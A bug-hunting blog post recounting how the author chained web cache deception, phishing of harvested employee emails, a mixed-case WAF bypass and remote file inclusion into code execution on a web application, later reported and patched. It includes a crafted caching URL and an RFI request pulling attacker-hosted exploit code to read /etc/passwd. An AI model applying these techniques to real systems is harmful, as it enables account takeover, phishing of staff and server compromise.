---
layout: post
published: true
title: Web Cache Deception To RCE
tags:
  - bug hunting
  - 
comments: true
---

**concept of web cache deception**
website uses cdn's for storing local cached copy of webpage like pdf,css.etc. so that when user revisits to that website the website will work faster and also for reducing loads
suppose two user bob and alice have two accounts on a website which is vulnerable to web cache deception alice is a hacker and bob is a victim..allice(attacker) 
send a link to victim bob like this : 
https://www.example.com/user/account/l.css
now what happened if bob opens this link his cache copy will stored to server and alice can easily takeover account of bob by retriving cache from server thats the simple mechanism of
web cache deception now lets move towards attack :)

**attack scenario**

i founded a web which was vulnerable to web cache deception but nothing was in that web application i founded a subdomain of same web application where only employee can access their
account that subdomain was made for employees i can't login to that subdomain.. i captured the login request of that subdomain i saw there was no header of pragma cache to avoid web 
cache deception attack ...i quicly extracted email of workers of that web applict ation thanx to <a href="https://www.phonebook..cz">phonebook</a> and after recon of 4 hours i was able 
to determine blueprint of employee panel in my mind when an employee login to that account he got redirectited to index.php i made a url something like this: https://www.example.com/
index.php/app0ly.css ans sends to that gmail and tricked them to open the link after few hours i open my linked and i saw that some one open the links ^__^ so i takeover someone account
but there was the problem i can only see the content of index.php when i go to setiings or any other option web application throws awy me from session *_*..

**escilating to rce** 

after spending few hours with capturing and sending request i saw there was a hidden java file in source code of index.php thanx to: <a href="https://www.waybackmachine.com">wayback</a>
after reaading the java file i got few parameters but most intresting waas parameter "?url=" and file?=...whic was something like "https://www.expample.php?url=" i tried to do ssrf but failed seems like htttp and https:// protocol was 
banned by WAF i tried various combinations like htTps:// , HTTPs:// etc. luckily, HttPs:// workred in my case and i got open redirection then i tried to test for remote file inculsion 
i created a payload for retriving "/etc/passwd" file i hosted that paylaod on my website and tried to fetch that mine v=webiste to vulnerable website like this:

www.example.com/index.php?file=HTtps://www.mywebsite.com/exploit.php

and voila! i was able to reterive /etc/passwd file and also able to obtain rce :( and pawned that web application i sent a report to them they patched the bug ^__^ 
that was about how i escilate the web cache to rce ! 

any privte programs :
send it to : <a href="mailto:nhibtaungamain@gmail.com">mohit</a>

tags: exploit
